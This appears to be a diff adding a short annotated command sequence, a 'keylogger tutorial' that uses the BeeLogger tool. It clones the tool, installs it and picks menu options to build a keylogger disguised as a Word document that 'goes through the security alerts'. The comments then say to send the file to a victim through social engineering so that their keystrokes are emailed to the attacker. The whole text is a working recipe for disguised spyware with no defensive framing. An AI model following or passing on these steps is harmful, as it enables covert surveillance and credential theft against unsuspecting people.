@@ -1,0 +1,21 @@
+#01/28/2021
+#wytecap
+#Keylogger tutorial via BeeLogger
+git clone https://github.com/4w4k3/BeeLogger.git
+#installs BeeLogger tool
+cd BeeLogger
+ls
+#goes to directory and examines what is there
+./install.sh
+#this command installs: 1)wine 2)python 3)pywin32 and others
+#after install================
+./bee.py
+K
+#generates keylogger
+2
+#fake word docx and allows you to go through the security alerts clearly
+#check credentials============
+Y
+Enter
+#generates keylogger file in /dist/folder under Beelogger output file location
+#this file is sent to a victim via social engineering and when they open it, keystrokes are sent to your entered Email address 
